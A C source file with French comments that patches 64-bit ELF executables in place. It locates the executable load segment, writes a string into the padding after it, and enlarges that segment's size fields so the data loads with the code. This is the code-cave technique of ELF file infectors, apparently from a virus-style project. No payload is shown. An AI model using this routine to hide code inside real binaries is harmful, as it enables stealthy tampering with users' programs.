#include "../include/death.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <elf.h>
#include <unistd.h>

int patch_meta_in_rx_segment(const char *path, const char *meta)
{
    FILE *f = fopen(path, "r+b");
    if (!f)
        return -1;

    Elf64_Ehdr eh;
    if (fread(&eh, 1, sizeof(eh), f) != sizeof(eh)) {
        fclose(f);
        return -1;
    }

    /* Vérif rapide ELF 64 bits */
    if (memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0 ||
        eh.e_ident[EI_CLASS] != ELFCLASS64) {
        fclose(f);
        return -1;
    }

    /* Aller aux Program Headers */
    if (fseek(f, eh.e_phoff, SEEK_SET) != 0) {
        fclose(f);
        return -1;
    }

    Elf64_Phdr phdr[64]; /* assez large pour la plupart des binaires */
    if (eh.e_phnum > 64) {
        fclose(f);
        return -1;
    }

    if (fread(phdr, sizeof(Elf64_Phdr), eh.e_phnum, f) !=
        (size_t)eh.e_phnum) {
        fclose(f);
        return -1;
    }

    int rx_idx = -1;
    for (int i = 0; i < eh.e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD &&
            (phdr[i].p_flags & PF_X) &&
            (phdr[i].p_flags & PF_R)) {
            rx_idx = i;
            break;
        }
    }

    if (rx_idx == -1) {
        fclose(f);
        return -1;
    }

    /* Chercher le segment suivant pour calculer le “trou” */
    Elf64_Off rx_end = phdr[rx_idx].p_offset + phdr[rx_idx].p_filesz;
    Elf64_Off next_off = (Elf64_Off)-1;

    for (int i = 0; i < eh.e_phnum; i++) {
        if (i == rx_idx)
            continue;
        if (phdr[i].p_offset > rx_end) {
            if (next_off == (Elf64_Off)-1 || phdr[i].p_offset < next_off)
                next_off = phdr[i].p_offset;
        }
    }

    /* Si pas de segment après, on peut considérer la fin de fichier comme limite */
    if (next_off == (Elf64_Off)-1) {
        if (fseek(f, 0, SEEK_END) != 0) {
            fclose(f);
            return -1;
        }
        long end = ftell(f);
        if (end < 0) {
            fclose(f);
            return -1;
        }
        next_off = (Elf64_Off)end;
    }

    size_t meta_len = strlen(meta);
    if (meta_len == 0) {
        fclose(f);
        return 0;
    }

    if (rx_end + meta_len > next_off) {
        /* pas assez de place dans le trou */
        fclose(f);
        return -1;
    }

    /* Écrire le meta à la fin du segment RX */
    if (fseek(f, rx_end, SEEK_SET) != 0) {
        fclose(f);
        return -1;
    }

    if (fwrite(meta, 1, meta_len, f) != meta_len) {
        fclose(f);
        return -1;
    }

    /* Mettre à jour p_filesz / p_memsz */
    phdr[rx_idx].p_filesz += meta_len;
    phdr[rx_idx].p_memsz  += meta_len; 

    /* Réécrire les Program Headers */
    if (fseek(f, eh.e_phoff, SEEK_SET) != 0) {
        fclose(f);
        return -1;
    }

    if (fwrite(phdr, sizeof(Elf64_Phdr), eh.e_phnum, f) !=
        (size_t)eh.e_phnum) {
        fclose(f);
        return -1;
    }

    fclose(f);
    return 0;
}
